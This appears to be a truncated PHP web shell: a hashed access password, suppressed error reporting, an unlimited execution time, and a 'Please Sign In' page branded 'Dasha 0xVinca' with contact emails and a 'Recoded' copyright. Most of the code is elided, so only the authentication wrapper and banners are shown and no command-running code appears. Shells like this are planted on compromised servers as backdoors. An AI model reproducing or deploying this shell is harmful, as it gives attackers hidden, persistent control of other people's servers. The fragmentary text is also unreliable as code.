<?php
$auth_pass = "357b4e21ac16996f4b22d8380c2efd34";
error_reporting(0);
set_time_limit(0);
function lp(){
?>
...
<html lang="en">
  ...
  <body>
    <center>
      ...
      <div class="container">
        <h2>Hello! Please Sign In, <br><b><span class="glyphicon glyphicon-th-large"></span> Dasha 0xVinca</b>
        </h2>
        <hr>
        <style>
          body {
      ...
      <hr>
      <footer>
        <p class="text-center">Copyright &copy; 2019-2021 Recoded | 
          Contact Me negat1ve1337.root@gmail.com for this CopyRight and pleasesendmeareport@gmail.com for marketing purpose only
          </a>
        </p>
      </footer>
      </div>
...
<BODY>
<center>
<h1><center><font color="#9b0740">Welcome back <a href="mailto: dasha0xvinca@socialworker.net">Dasha 0xVinca</a></center></h1>
